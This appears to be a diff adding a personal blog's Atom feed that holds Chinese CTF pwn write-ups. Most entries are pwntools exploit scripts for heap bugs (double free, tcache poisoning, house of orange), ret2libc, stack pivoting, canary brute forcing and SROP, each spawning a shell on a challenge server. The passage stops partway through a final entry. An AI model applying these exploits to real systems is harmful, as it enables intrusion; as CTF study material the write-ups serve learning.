@@ -1,0 +1,1851 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://l1u66.github.io/</id>
+    <title>L1u66&apos;s blog</title>
+    <updated>2024-06-08T18:06:03.505Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://l1u66.github.io/"/>
+    <link rel="self" href="https://l1u66.github.io/atom.xml"/>
+    <subtitle>世间万般兵刃，唯有过往伤人最深</subtitle>
+    <logo>https://l1u66.github.io/images/avatar.png</logo>
+    <icon>https://l1u66.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2024, L1u66&apos;s blog</rights>
+    <entry>
+        <title type="html"><![CDATA[kali磁盘不足问题]]></title>
+        <id>https://l1u66.github.io/post/kali-ci-pan-bu-zu-wen-ti/</id>
+        <link href="https://l1u66.github.io/post/kali-ci-pan-bu-zu-wen-ti/">
+        </link>
+        <updated>2024-06-06T03:43:00.000Z</updated>
+        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/qq_41359358/article/details/138281097?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EYuanLiJiHua%7EPosition-2-138281097-blog-121539726.235%5Ev43%5Epc_blog_bottom_relevance_base4&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EYuanLiJiHua%7EPosition-2-138281097-blog-121539726.235%5Ev43%5Epc_blog_bottom_relevance_base4&amp;utm_relevant_index=5">一遍过</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[litctf]]></title>
+        <id>https://l1u66.github.io/post/litctf/</id>
+        <link href="https://l1u66.github.io/post/litctf/">
+        </link>
+        <updated>2024-06-02T05:24:37.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="heap-223">heap-2.23</h1>
+<p>2.23的libc,存在uaf漏洞和edit功能(都是一个附件，只是换了libc版本)这里选择double free改malloc_hook</p>
+<pre><code>from pwn import *
+from LibcSearcher import *
+context(os=&quot;linux&quot;, arch=&quot;i386&quot;, log_level=&quot;debug&quot;)
+
+#p = process(&quot;./heap&quot;)
+p = remote('node3.anna.nssctf.cn',28694)
+elf = ELF(&quot;./heap&quot;)
+
+def add(idx,size):
+	p.recvuntil(&quot;&gt;&gt;&quot;)
+	p.sendline(&quot;1&quot;)
+	p.recvuntil(&quot;idx? &quot;)
+	p.sendline(str(idx))
+	p.recvuntil(&quot;size? &quot;)
+	p.sendline(str(size))
+    
+def dele(idx):
+	p.recvuntil(&quot;&gt;&gt;&quot;)
+	p.sendline(&quot;2&quot;)
+	p.recvuntil(b&quot;idx? &quot;)
+	p.sendline(str(idx))
+	
+def edit(idx,string):
+	p.recvuntil(&quot;&gt;&gt;&quot;)
+	p.sendline(&quot;4&quot;)
+	p.recvuntil(&quot;idx? &quot;)
+	p.sendline(str(idx))
+	p.recvuntil(&quot;content : \n&quot;)
+	p.sendline(string)
+	
+def show(idx):
+	p.recvuntil(&quot;&gt;&gt;&quot;)
+	p.sendline(&quot;3&quot;)
+	p.recvuntil(b&quot;idx? &quot;)
+	p.sendline(str(idx))
+
+def exit():
+	p.recvuntil(&quot;choice\n&quot;)
+	p.sendline(&quot;5&quot;)
+	
+add(0,1060)
+add(2,0x68)
+add(3,0x68)
+add(1,16)
+dele(0)
+show(0)
+main = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
+base = main - 3951480
+onegadget = [0x4527a,0xf03a4,0xf1247]
+one_gadget = base + onegadget[2]
+malloc_hook = main - 88 - 0x10
+
+print(hex(malloc_hook))
+dele(2)
+dele(3)
+dele(2)
+edit(2,p64(main - 139))
+add(4,0x68)
+add(5,0x68)
+edit(5,b'a'*19 + p64(one_gadget))
+print(hex(malloc_hook))
+#gdb.attach(p)
+add(7,0x10)
+
+p.interactive()
+</code></pre>
+<h1 id="heap-227">heap-2.27</h1>
+<p>这里选择tcache poisoning</p>
+<pre><code>from pwn import *
+from LibcSearcher import *
+context(os=&quot;linux&quot;, arch=&quot;i386&quot;, log_level=&quot;debug&quot;)
+
+#p = process(&quot;./heap&quot;)
+p = remote('node2.anna.nssctf.cn',28077)
+#elf = ELF(&quot;./heap&quot;)
+
+def add(idx,size):
+	p.recvuntil(&quot;&gt;&gt;&quot;)
+	p.sendline(&quot;1&quot;)
+	p.recvuntil(&quot;idx? &quot;)
+	p.sendline(str(idx))
+	p.recvuntil(&quot;size? &quot;)
+	p.sendline(str(size))
+    
+def dele(idx):
+	p.recvuntil(&quot;&gt;&gt;&quot;)
+	p.sendline(&quot;2&quot;)
+	p.recvuntil(b&quot;idx? &quot;)
+	p.sendline(str(idx))
+	
+def edit(idx,string):
+	p.recvuntil(&quot;&gt;&gt;&quot;)
+	p.sendline(&quot;4&quot;)
+	p.recvuntil(&quot;idx? &quot;)
+	p.sendline(str(idx))
+	p.recvuntil(&quot;content : \n&quot;)
+	p.sendline(string)
+	
+def show(idx):
+	p.recvuntil(&quot;&gt;&gt;&quot;)
+	p.sendline(&quot;3&quot;)
+	p.recvuntil(b&quot;idx? &quot;)
+	p.sendline(str(idx))
+
+def exit():
+	p.recvuntil(&quot;&gt;&gt;&quot;)
+	p.sendline(&quot;5&quot;)
+#gdb.attach(p,$rebase'0x178B')	
+add(0,1060)
+add(2,0x68)
+add(3,0x68)
+add(1,16)
+dele(0)
+show(0)
+main = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
+base = main - 4111520
+
+onegadget = [0x4f29e,0x4f2a5,0x4f302,0x10a2fc]
+one_gadget = base + onegadget[3]
+malloc_hook = main - 96 - 0x10
+
+dele(2)
+dele(3)
+
+edit(3,p64(malloc_hook))
+add(4,0x68)
+add(5,0x68)
+edit(5,p64(one_gadget))
+print(&quot;one_gadget = &quot;,hex(one_gadget))
+#gdb.attach(p)	
+print(&quot;malloc_hook = &quot;,hex(malloc_hook))
+add(10,0x10)
+p.interactive()
+</code></pre>
+<h1 id="heap-231">heap-2.31</h1>
+<p>这里打exit hook</p>
+<pre><code>from pwn import *
+from LibcSearcher import *
+context(os=&quot;linux&quot;, arch=&quot;i386&quot;, log_level=&quot;debug&quot;)
+
+#p = process(&quot;./heap&quot;)
+p = remote('node3.anna.nssctf.cn',28424)
+elf = ELF(&quot;./heap&quot;)
+
+def add(idx,size):
+	p.recvuntil(&quot;&gt;&gt;&quot;)
+	p.sendline(&quot;1&quot;)
+	p.recvuntil(&quot;idx? &quot;)
+	p.sendline(str(idx))
+	p.recvuntil(&quot;size? &quot;)
+	p.sendline(str(size))
+    
+def dele(idx):
+	p.recvuntil(&quot;&gt;&gt;&quot;)
+	p.sendline(&quot;2&quot;)
+	p.recvuntil(b&quot;idx? &quot;)
+	p.sendline(str(idx))
+	
+def edit(idx,string):
+	p.recvuntil(&quot;&gt;&gt;&quot;)
+	p.sendline(&quot;4&quot;)
+	p.recvuntil(&quot;idx? &quot;)
+	p.sendline(str(idx))
+	p.recvuntil(&quot;content : \n&quot;)
+	p.sendline(string)
+	
+def show(idx):
+	p.recvuntil(&quot;&gt;&gt;&quot;)
+	p.sendline(&quot;3&quot;)
+	p.recvuntil(b&quot;idx? &quot;)
+	p.sendline(str(idx))
+
+def exit():
+	p.recvuntil(&quot;&gt;&gt;&quot;)
+	p.sendline(&quot;5&quot;)
+#gdb.attach(p,$rebase'0x178B')	
+add(0,1060)
+add(2,0x68)
+add(3,0x68)
+add(1,16)
+dele(0)
+show(0)
+main = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
+base = main - 2018272
+
+ld_base = base + 2236416
+print(&quot;ld_base = &quot;,hex(ld_base))
+_dl_rtld_lock_recursive = ld_base + 0xf60 + 8
+_dl_rtld_unlock_recursive = _dl_rtld_lock_recursive + 8
+_dl_load_lock = _dl_rtld_unlock_recursive - 0x608
+__libc_atexit = base + 0x1ED608
+
+onegadget = [0xe3afe,0xe3b01,0xe3b04]
+one_gadget = base + onegadget[0]
+malloc_hook = main - 88 - 0x10
+print(&quot;_dl_rtld_lock_recursive = &quot;,hex(_dl_rtld_lock_recursive))
+
+dele(2)
+dele(3)
+
+edit(3,p64(_dl_rtld_lock_recursive))
+add(4,0x68)
+add(5,0x68)
+edit(5,p64(one_gadget))
+print(&quot;one_gadget = &quot;,hex(one_gadget))
+#gdb.attach(p)	
+print(&quot;malloc_hook = &quot;,hex(malloc_hook))
+exit()
+p.interactive()
+</code></pre>
+<h1 id="heap-235">heap-2.35</h1>
+<p>该版本无法使用hook，打堆栈结合，通过<code>p &amp;environ</code>泄露栈地址，直接申请ret地址会有对齐错误，这里有ptr的bss段保存着堆地址，申请到这里然后改掉指针打ROP</p>
+<pre><code>from pwn import *
+from LibcSearcher import *
+context(os=&quot;linux&quot;, arch=&quot;i386&quot;, log_level=&quot;debug&quot;)
+
+p = process(&quot;./heap&quot;)
+#p = remote('node2.anna.nssctf.cn',28077)
+#elf = ELF(&quot;./heap&quot;)
+
+def add(idx,size):
+	p.recvuntil(&quot;&gt;&gt;&quot;)
+	p.sendline(&quot;1&quot;)
+	p.recvuntil(&quot;idx? &quot;)
+	p.sendline(str(idx))
+	p.recvuntil(&quot;size? &quot;)
+	p.sendline(str(size))
+    
+def dele(idx):
+	p.recvuntil(&quot;&gt;&gt;&quot;)
+	p.sendline(&quot;2&quot;)
+	p.recvuntil(b&quot;idx? &quot;)
+	p.sendline(str(idx))
+	
+def edit(idx,string):
+	p.recvuntil(&quot;&gt;&gt;&quot;)
+	p.sendline(&quot;4&quot;)
+	p.recvuntil(&quot;idx? &quot;)
+	p.sendline(str(idx))
+	p.recvuntil(&quot;content : \n&quot;)
+	p.send(string)
+	
+def show(idx):
+	p.recvuntil(&quot;&gt;&gt;&quot;)
+	p.sendline(&quot;3&quot;)
+	p.recvuntil(b&quot;idx? &quot;)
+	p.sendline(str(idx))
+
+def exit():
+	p.recvuntil(&quot;&gt;&gt;&quot;)
+	p.sendline(&quot;5&quot;)
+	
+add(0,1060)
+add(2,0x68)
+add(3,0x68)
+add(1,16)
+dele(0)
+show(0)
+main = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
+base = main - 2206944
+env = base + 2236928
+print(&quot;base = &quot;,hex(base))
+dele(2)
+dele(3)
+show(2)
+p.recvuntil(b'content : ')
+key = u64(p.recv(5).ljust(8,b'\x00'))#288
+edit(3,p64(key ^ env))
+print(&quot;heap = &quot;,hex(key))
+print(&quot;env = &quot;,hex(env))
+add(4,0x68)
+add(5,0x68)
+show(5)
+stack = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - 288 - 8
+print(&quot;stack = &quot;,hex(stack))
+add(6,0x78)
+add(7,0x78)
+dele(6)
+dele(7)
+edit(7,p64(key ^ stack))
+
+add(8,0x78)
+add(9,0x78)
+rdi = base + 0x000000000002a3e5
+ret = base + 0x0000000000029139
+sys = base + 0x0000000000050D70
+sh = base + 0x00000000001D8678
+
+pay = b'a'*24
+
+edit(9,pay)
+print(&quot;stack = &quot;,hex(stack))
+show(9)
+bss = u64(p.recvuntil(b'\x55')[-6:].ljust(8,b'\x00')) - 0x17a1
+print(&quot;bss = &quot;,hex(bss))
+ptr = bss + 0x4060
+print(&quot;ptr = &quot;,hex(ptr))
+add(10,0x58)
+add(11,0x58)
+dele(10)
+dele(11)
+edit(11,p64(key ^ (ptr + 64)))
+add(12,0x58)
+add(13,0x58)
+
+edit(13,p64(0) + p64(stack - 32))
+pay = b'a'*8 + p64(ret) + p64(rdi) + p64(sh) + p64(sys)
+print(&quot;ptr = &quot;,hex(ptr))
+#gdb.attach(p)
+edit(9,pay)
+
+p.interactive()
+</code></pre>
+<h1 id="atm">ATM</h1>
+<p>ret2libc</p>
+<pre><code>from pwn import *
+from LibcSearcher import *
+context(os=&quot;linux&quot;, arch=&quot;i386&quot;, log_level=&quot;debug&quot;)
+
+#p = process(&quot;./app&quot;)
+p = remote('node1.anna.nssctf.cn',28849)
+	
+#
+leave = 0x000000000040147c
+rdi = 0x0000000000401233
+bss = 0x000000000404040 + 0x800
+ret = 0x000000000040101a
+p.sendafter(b&quot;password:\n&quot;,b'1')
+p.sendafter(b'Exit\n',b'3')
+p.sendafter(b'deposit:',b'1000')
+p.sendlineafter(b'Exit\n',b'5')
+p.recvuntil(b'0x')
+printf = int(p.recv(12),16)
+base = printf - 0x000000000060770
+print(&quot;base = &quot;,hex(base))
+sys = base + 0x000000000050D60
+sh = base + 0x0000000001D8698
+pay = b'a'*360 + p64(rdi) + p64(sh) + p64(ret) + p64(sys)
+p.send(pay)
+#gdb.attach(p)
+p.sendafter(b'Exit\n',b'4')
+
+p.interactive()
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[龙CTF]]></title>
+        <id>https://l1u66.github.io/post/long-ctf/</id>
+        <link href="https://l1u66.github.io/post/long-ctf/">
+        </link>
+        <updated>2024-05-29T07:47:22.000Z</updated>
+        <content type="html"><![CDATA[<p><img src="https://l1u66.github.io//post-images/1716968933067.png" alt="" loading="lazy"><br>
+痛失壹佰元子😭，第一次ak，出的比较简单</p>
+<h1 id="pwn">pwn</h1>
+<h2 id="stack">stack</h2>
+<p>查看程序只有一个read且溢出了0x10个字节，打栈迁移，迁移两次，一次泄露libc地址一次得到shell，由于需要再次read所以直接利用main函数</p>
+<pre><code>from pwn import *
+from LibcSearcher import *
+context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
+
+#p = process(&quot;./pwn&quot;)
+p = remote(&quot;challenge.qsnctf.com&quot;,31454)
+#elf = ELF(&quot;./pwn&quot;)
+
+rdi = 0x0000000000401210
+rsi_r15 = 0x0000000000401281
+rbp = 0x000000000040115d
+bss = 0x0000000000404000 + 0x500
+puts = 0x401060
+got = 0x000000000404028
+leave = 0x00000000004011be
+
+#gdb.attach(p)
+
+payload = b'a'*0x100 + p64(bss + 0x100) + p64(0x00000000040119B)
+p.sendafter(&quot;pivoting?\n&quot;,payload)
+
+pay = p64(rdi) + p64(got) + p64(puts) + p64(rbp) + p64(bss+0x300+0x100) + p64(0x00000000040119B)
+pay = pay.ljust(0x100,b'\x00') + p64(bss - 8) + p64(leave)
+p.send(pay)
+read_addr = u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b'\x00'))
+print(hex(read_addr))
+#base = read_addr - 0x10E1E0#0x00000000010DFC0
+libc_base = read_addr - 0x00000000010DFC0
+print(hex(libc_base))
+
+#onegadget = [0xe3afe,0xe3b01,0xe3b04]
+#one_gadget = libc_base + onegadget[0]
+
+system = libc_base + 0x52290
+bin_sh = libc_base + 0x1B45BD
+pay3 =(b'a'*8 + p64(rdi) + p64(bin_sh) + p64(rdi+1)+p64(system)).ljust(0x100,b'\x00')
+pay3 += p64(bss+0x300) + p64(leave)
+p.send(pay3)
+
+p.interactive()
+</code></pre>
+<h2 id="canary">canary</h2>
+<p>一直fork，有个栈溢出漏洞，由于fork出的canary不变，所以可以爆破canary，静态编译的程序，可以直接生成ropchain取得shell<br>
+相关指令：<br>
+<code>ROPgadget --binary pwn --ropchain</code></p>
+<pre><code>from pwn import *
+from LibcSearcher import *
+context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
+local = 0
+elf = ELF('./pwn')
+
+if local:
+    io = process('./pwn')
+    libc = elf.libc
+
+else:
+    io = remote('challenge.qsnctf.com',31636)
+  
+
+io.recvuntil('input:\n')
+canary = b'\x00'
+for k in range(7):          #要爆破的字节数
+    for i in range(256):
+        payload = b'a'*0x108 + canary + bytes([i])  
+        io.send(payload)
+        data = io.recvuntil(&quot;input:\n&quot;)  #data接收的是welcome\n前的全部内容
+        print(data)
+        if b'stack' not in data:
+            canary += bytes([i])  
+            print(&quot;canary is:&quot; + str(canary))#确保canary为字符串
+            break
+print(&quot;canary is:&quot;,hex(u64(canary)))
+#!/usr/bin/env python3
+# execve generated by ROPgadget
+
+from struct import pack
+
+# Padding goes here
+p = b''
+p += pack('&lt;Q', 0x000000000040f23e) # pop rsi ; ret
+p += pack('&lt;Q', 0x00000000004c10e0) # @ .data
+p += pack('&lt;Q', 0x00000000004493d7) # pop rax ; ret
+p += b'/bin/sh\x00'
+p += pack('&lt;Q', 0x000000000047c4e5) # mov qword ptr [rsi], rax ; ret
+p += pack('&lt;Q', 0x000000000040f23e) # pop rsi ; ret
+p += pack('&lt;Q', 0x00000000004c10e8) # @ .data + 8
+p += pack('&lt;Q', 0x00000000004437a0) # xor rax, rax ; ret
+p += pack('&lt;Q', 0x000000000047c4e5) # mov qword ptr [rsi], rax ; ret
+p += pack('&lt;Q', 0x00000000004018c2) # pop rdi ; ret
+p += pack('&lt;Q', 0x00000000004c10e0) # @ .data
+p += pack('&lt;Q', 0x000000000040f23e) # pop rsi ; ret
+p += pack('&lt;Q', 0x00000000004c10e8) # @ .data + 8
+p += pack('&lt;Q', 0x00000000004017cf) # pop rdx ; ret
+p += pack('&lt;Q', 0x00000000004c10e8) # @ .data + 8
+p += pack('&lt;Q', 0x00000000004493d7) # pop rax ; ret
+p += p64(59)
+p += pack('&lt;Q', 0x00000000004012d3) # syscall
+pay = b''
+for i in range(len(p)):
+        pay += (ord(p[i:i+1])).to_bytes(1)
+#gdb.attach(io)        
+payload0 = b'a'*0x108 + canary + p64(0) + pay
+print(len(payload0))
+
+io.send(payload0)
+io.interactive()
+</code></pre>
+<h2 id="srop_seccomp">srop_seccomp</h2>
+<p>开了沙盒，允许orw，有mov_rax_0xf和syscall的gadgets，所以打srop并且题目也有提示，第一次read读取了很多，栈迁移到第一次输入的bss段打srop。注意一下偏移即可</p>
+<pre><code>from pwn import *
+from LibcSearcher import *
+context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
+
+#p = process(&quot;./chall&quot;)
+p = remote(&quot;challenge.qsnctf.com&quot;,31938)
+elf = ELF(&quot;./chall&quot;)
+mov_rax_0xf = 0x0000000000401194
+bss = 0x404020 + 0x800
+syscall = 0x40118a
+flag = 0x404060
+leave = 0x000000000040136c
+
+#gdb.attach(p)
+sigframe = SigreturnFrame()
+sigframe.rax = constants.SYS_open
+sigframe.rdi = flag
+sigframe.rsi = 0
+sigframe.rdx = 0
+sigframe.rsp = 0x404170
+sigframe.rip = syscall
+
+sigframe1 = SigreturnFrame()
+sigframe1.rax = constants.SYS_read
+sigframe1.rdi = 3
+sigframe1.rsi = bss - 0x100
+sigframe1.rdx = 50
+sigframe1.rsp = 0x404278
+sigframe1.rip = syscall
+
+sigframe2 = SigreturnFrame()
+sigframe2.rax = constants.SYS_write
+sigframe2.rdi = 1
+sigframe2.rsi = bss - 0x100
+sigframe2.rdx = 50
+sigframe2.rsp = bss + 0x10 + 256*3
+sigframe2.rip = syscall
+
+payload = b&quot;./flag\x00\x00&quot; + p64(0) + p64(mov_rax_0xf) + p64(syscall) + bytes(sigframe) + p64(mov_rax_0xf) + p64(syscall) + bytes(sigframe1) + p64(mov_rax_0xf) + p64(syscall) + bytes(sigframe2)
+p.send(payload)
+
+pay = b'a'*42 + p64(flag + 0x8) + p64(leave)
+p.sendafter('SUID?',pay)
+p.interactive()
+</code></pre>
+<h2 id="ez_quiz">ez_quiz</h2>
+<p>c语言伪随机+一点点re，逆向都得到token:<code>DRKCTF{P13@s3_1e@k_thE_addr_0f_7he_cAnARy_@nd_pie}</code><br>
+绕过伪随机后进入gift函数，第一次格式化字符串泄露canary和程序基地址，第二次栈溢出到后门函数<br>
+利用ctypes库在python代码中调用C语言函数，步骤如下：</p>
+<p>1.创建一个C语言源代码文件，假设名为1.c</p>
+<pre><code class="language-c">#include &lt;stdlib.h&gt;
+#include &lt;time.h&gt;
+void set_seed() 
+{
+	time_t seed = time(0);
+	srand(seed);
+}
+int random_number() 
+{    
+	return rand();
+}
+</code></pre>
+<p>2.将其编译为一个动态链接库</p>
+<pre><code>gcc -shared -o 1.so 1.c
+</code></pre>
+<p>exp：</p>
+<pre><code class="language-python">from pwn import *
+from LibcSearcher import *
+import ctypes
+context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
+
+#p = process(&quot;./attachment&quot;)
+p = remote(&quot;challenge.qsnctf.com&quot;,31788)
+#elf = ELF(&quot;./pwn&quot;)
+
+# 加载动态链接库
+lib = ctypes.CDLL('./1.so')
+lib.random_number.restype = ctypes.c_int
+# 调用C语言的set_seed函数
+lib.set_seed()
+# 调用C语言的random_number函数
+result = lib.random_number()
+rand = result % 256
+print(rand)
+
+def lfsr_h(a1):
+    v2 = a1 &gt;&gt; 1
+    if (a1 &amp; 1) == 1:
+        v2 ^= 0xB8
+    return v2
+
+# 初始化
+v8 = rand  # 初始值，可以根据需要更改
+v12 = v11 = v10 = v9 = 0
+
+# 主循环，进行160次迭代
+for i in range(160):
+    v8 = lfsr_h(v8)
+    
+    # 在特定的迭代次数上保存值
+    if i == 156:
+        v12 = v8
+    if i == 157:
+        v11 = v8
+    if i == 158:
+        v10 = v8
+    if i == 159:
+        v9 = v8
+# 输出结果
+p.sendlineafter(b'token: ',b&quot;DRKCTF{P13@s3_1e@k_thE_addr_0f_7he_cAnARy_@nd_pie}&quot;)
+
+print(f&quot;v12: {v12}&quot;)
+print(f&quot;v11: {v11}&quot;)
+print(f&quot;v10: {v10}&quot;)
+print(f&quot;v9: {v9}&quot;)
+x = (( v9 - v10 ) * v11 ) % v12
+p.sendlineafter(b'?',str(x))
+
+p.sendlineafter('gift:\n',b&quot;%11$p-%13$p&quot;)
+p.recvuntil(&quot;0x&quot;)
+canary = int(p.recv(16)  ,16)
+print(&quot;canary = &quot;,hex(canary))
+p.recvuntil(&quot;-&quot;)
+backdoor = int(p.recv(16)  ,16) - 1131 - 0x1BD7 + 0x1426
+print(&quot;backdoor = &quot;,hex(backdoor))
+#gdb.attach(p)
+payload = b'a'*40 + p64(canary) + p64(0) + p64(backdoor)
+p.send(payload)
+p.interactive()
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[ciscn2024]]></title>
+        <id>https://l1u66.github.io/post/ciscn2024/</id>
+        <link href="https://l1u66.github.io/post/ciscn2024/">
+        </link>
+        <updated>2024-05-23T13:47:14.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="orange_cat_diary">orange_cat_diary</h1>
+<p>2.23的libc，无限制的add和edit，show和free只有一次，并且只能对新申请的chunk进行操作，存在8字节溢堆出和uaf漏洞，题目提示打house of orange，堆覆盖到top chunk将其只保留后三位（十六进制），然后申请一个0x1000的堆，top chunk就会到unsorted bin中，可借此泄露libc地址，然后利用uaf和唯一的一次free机会修改fastbin的fd指针，申请到malloc_hook</p>
+<pre><code>from pwn import *
+from LibcSearcher import *
+context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
+p = process('./orange_cat_diary')
+elf = ELF('./orange_cat_diary')
+libc = elf.libc
+
+def add(size,content=&quot;name&quot;):
+	p.sendlineafter(&quot;choice:&quot;, &quot;1&quot;)
+	p.sendlineafter(&quot;content:&quot;, str(size))
+	p.sendafter(&quot;content:\n&quot;, content)
+	
+def show():
+	p.sendlineafter(&quot;choice:&quot;, &quot;2&quot;)
+    	
+def dele():
+	p.sendlineafter(&quot;choice:&quot;, &quot;3&quot;)
+
+def edit(size,content):
+	p.sendlineafter(&quot;choice:&quot;, &quot;4&quot;)
+	p.sendlineafter(&quot;content:&quot;, str(size))
+	p.sendlineafter(&quot;content:\n&quot;, content)
+
+p.sendafter('name.\n',b'name')
+
+gdb.attach(p,&quot;bp $rebase(0xEDA)&quot;)
+add(0x18)
+edit(32,b'a'*0x18+p64(0xfe1))
+add(0x1000)
+add(0x10,b'\x78')
+show()
+p.recvuntil('\x7f')
+main_arena = u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00')) - 88
+libc_base = main_arena + 88 - 3953032
+print(&quot;libc_base = &quot;,hex(libc_base))
+
+malloc_hook = main_arena - 0x10 - 1536 - 16
+print(&quot;malloc_hook = &quot;,hex(malloc_hook))
+onegadget = [0x4527a,0xf03a4,0xf1247]
+one_gadget = libc_base + onegadget[1]
+
+add(0x68)
+dele()
+edit(0x68,p64(malloc_hook-35))
+add(0x68)
+add(0x68,b'\x00'*19 + p64(one_gadget))
+
+p.interactive()
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[H&NCTF]]></title>
+        <id>https://l1u66.github.io/post/handnctf/</id>
+        <link href="https://l1u66.github.io/post/handnctf/">
+        </link>
+        <updated>2024-05-13T15:51:51.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="close">close</h1>
+<p>本校新生赛出过，把输出重定向到输入秒了</p>
+<pre><code>exec 1&gt;&amp;0
+cat flag
+</code></pre>
+<h1 id="what">what</h1>
+<p>2.27的libc，uaf改malloc_hook</p>
+<pre><code>from pwn import *
+from LibcSearcher import *
+context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
+
+#p = process(&quot;./what&quot;)
+p = remote(&quot;hnctf.imxbt.cn&quot;,29947)
+elf = ELF(&quot;./what&quot;)
+
+def add(size):
+	p.recvuntil(&quot;command:\n&quot;)
+	p.sendline(&quot;1&quot;)
+	p.recvuntil(&quot;size:\n&quot;)
+	p.sendline(str(size))
+    
+def dele():
+	p.recvuntil(&quot;command:\n&quot;)
+	p.sendline(&quot;2&quot;)
+
+	
+def edit(size,string):
+	p.recvuntil(&quot;command:\n&quot;)
+	p.sendline(&quot;4&quot;)
+	p.recvuntil(&quot;idx:\n&quot;)
+	p.sendline(str(size))
+	p.recvuntil(&quot;content:\n&quot;)
+	p.sendline(string)
+	
+def show(idx):
+	p.recvuntil(&quot;command:\n&quot;)
+	p.sendline(&quot;3&quot;)
+	p.recvuntil(b&quot;idx:\n&quot;)
+	p.sendline(str(idx))
+
+def exit():
+	p.recvuntil(&quot;choice\n&quot;)
+	p.sendline(&quot;5&quot;)
+	
+add(1060)#0
+add(24)#1
+add(24)#2
+dele()
+dele()
+dele()
+show(0)
+base = u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b'\x00')) - 4111520
+print(&quot;base = &quot;,hex(base))
+onegadget = [0x4f29e,0x4f2a5,0x4f302,0x10a2fc]
+one_gadget = base + onegadget[3]
+
+edit(1,p64(base+4111408))
+
+add(24)#0
+add(24)#1
+edit(1,p64(one_gadget))
+#gdb.attach(p)
+p.recvuntil(&quot;command:\n&quot;)
+p.sendline(&quot;1&quot;)
+p.recvuntil(&quot;size:\n&quot;)
+p.sendline(str(24))
+
+p.interactive()
+</code></pre>
+<h1 id="ez_pwn">ez_pwn</h1>
+<p>32位的栈迁移，题本身不难，栈溢出一个ebp的大小，但是32位的做的题太少了，错误频出，注意两点：1.&quot;/bin/sh\x00&quot;字符串的位置应放在调用system函数之后，不然执行函数时容易把字符串覆盖掉<br>
+2.system的plt表和system的参数之间应该有四个字节充当fake ebp</p>
+<pre><code>from pwn import *
+from LibcSearcher import *
+context(os=&quot;linux&quot;, arch=&quot;i386&quot;, log_level=&quot;debug&quot;)
+
+flag=0
+if flag==1:
+	p = process(&quot;./pwn&quot;)
+	gdb.attach(p)
+else:
+	p = remote(&quot;hnctf.imxbt.cn&quot;,50025)
+
+pay = b'a'*44
+p.sendafter(&quot;name?\n&quot;,pay)
+
+plt = 0x8048400
+sys = 0x804857B
+
+base = u32(p.recvuntil(&quot;\xff&quot;)[-4:])
+print(&quot;base = &quot;,hex(base))
+
+#payload =  p32(0)*4 + p32(0x8048400) + p32(0) + p32(base-28) + b'cat flag' + p32(0)*2 + p32(base-44)
+payload =  p32(0)*4 + p32(0x8048400) + p32(0) + p32(base-28) + b'/bin/sh\x00' + p32(0)*2 + p32(base-44)
+
+p.send(payload)
+
+p.interactive()
+</code></pre>
+<h1 id="idea">idea</h1>
+<p>32位的ret2libc，开了canary，通过整数溢出有一个格式化字符串可以泄露canary</p>
+<pre><code>from pwn import *
+#p = process('./pwn')
+elf = ELF('./idea')
+lib = ELF('./libc-2.23.so')
+p = remote('hnctf.imxbt.cn', 56459)
+
+p.recvuntil(b'?')
+p.sendline(b'-1')
+p.recvuntil(b'!')
+p.sendline(b'%7$p')
+p.recvuntil(b'0x')
+canary = int(p.recv(8), 16)
+p.recvuntil(b'!')
+payload = b'a' * 32 + p32(canary) + p32(0) * 3 + p32(elf.plt['puts']) + p32(elf.sym['main']) + p32(elf.got['puts'])
+p.sendline(payload)
+base_addr = u32(p.recvuntil(b'\xf7')[-4:]) - lib.sym['puts']
+print(hex(base_addr))
+
+system = base_addr + lib.sym['system']
+binsh = base_addr + next(lib.search(b'/bin/sh'))
+p.recvuntil(b'?')
+p.sendline(b'-1')
+p.recvuntil(b'!')
+p.sendline(b'%7$p')
+p.recvuntil(b'!')
+payload = b'a' * 32 + p32(canary) + p32(0) * 3 + p32(system) + p32(elf.sym['main']) + p32(binsh)
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[tut校赛]]></title>
+        <id>https://l1u66.github.io/post/tut-xiao-sai/</id>
+        <link href="https://l1u66.github.io/post/tut-xiao-sai/">
+        </link>
+        <updated>2024-05-06T13:53:58.000Z</updated>
+        <content type="html"><![CDATA[<p>队友太强了，带我库库上分😎</p>
+<h1 id="ezrop">ezrop</h1>
+<p>pwn签到题，ret2libc</p>
+<pre><code>from pwn import *
+from LibcSearcher import *
+context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)
+
+#p = process('./ezrop')
+p = remote(&quot;36.212.170.17&quot;,9997)
+elf = ELF('./ezrop')
+
